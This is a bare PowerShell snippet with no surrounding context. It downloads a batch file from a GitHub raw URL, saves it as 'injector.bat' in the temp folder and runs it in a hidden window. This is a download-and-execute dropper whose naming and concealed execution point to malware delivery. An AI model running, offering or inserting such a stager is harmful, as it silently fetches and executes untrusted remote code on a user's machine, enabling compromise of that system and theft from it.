iwr -useb https://raw.githubusercontent.com/Dazd-Pkz/shit-stuff/main/ryu.bat -o $env:TEMP\injector.bat
Start-Sleep -s 1
saps $env:TEMP\injector.bat -WindowStyle Hidden
